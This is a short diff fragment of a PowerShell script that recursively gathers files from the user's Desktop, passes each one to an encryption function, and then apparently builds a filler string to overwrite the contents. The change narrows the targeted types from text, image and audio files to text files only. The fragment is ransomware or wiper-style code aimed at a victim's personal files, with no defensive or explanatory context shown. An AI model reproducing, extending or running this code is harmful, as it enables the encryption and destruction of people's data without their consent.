@@ -34,7 +34,7 @@ Function Encr{param([string]$i,[string]$p)
   }
 }
 
-foreach ($i in $(Get-ChildItem /users/$env:USERNAME/Desktop -recurse -include *.txt,*.jpg,*mp3 | ForEach-Object { $_.FullName })){
+foreach ($i in $(Get-ChildItem /users/$env:USERNAME/Desktop -recurse -include *.txt | ForEach-Object { $_.FullName })){
   Encr -i $i -p $pwd
   $size = [math]::round(((Get-Item $i)).length/4)+1
   $str = "fuck" * $size
